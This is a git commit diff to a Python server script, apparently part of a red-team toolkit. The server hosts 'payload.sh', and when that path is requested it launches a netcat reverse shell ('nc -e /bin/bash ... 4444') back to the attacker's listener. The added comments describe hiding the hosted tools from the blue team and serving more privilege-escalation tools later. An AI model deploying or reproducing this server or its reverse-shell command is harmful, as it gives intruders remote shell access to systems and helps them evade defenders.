6c6a73eaae9a789fc5ea82faf30fbeceb70e1a16
Lucas Frink <frinklucas@yahoo.com>
2025-02-11 21:29:41 -0500

    small changes

--- server.py
+++ server.py
@@ -3,10 +3,11 @@ import subprocess
 
 class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
     def do_GET(self):
-        allowed_files=['/payload.sh']
+        allowed_files=['/payload.sh'] #only specific filles are allowed to be accessed via IP so even if blue team tries to look at the site hosting tools they have to know which dirs are allowed to be accessed 
+        #hopefully this web server will host other tools that can be gotten through the curl command and used for further priv escalation purposes
 
         if self.path in allowed_files:
-            if self.path == '/payload.sh':
+            if self.path == '/payload.sh': #checks if desired path is to the payload then starts reverse shell via netcat
                 self.execute_reverse_shell()
             super().do_GET()
         else:
@@ -17,7 +18,7 @@ class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
     def execute_reverse_shell(self):
         print("[*] Triggering reverse shell...")
 
-        reverse_shell_command = "nc -e /bin/bash 127.0.0.1 4444"
+        reverse_shell_command = "nc -e /bin/bash 127.0.0.1 4444" #makes a connection back to the attacker machine who is listening 
 
         subprocess.Popen(reverse_shell_command, shell=True)
     
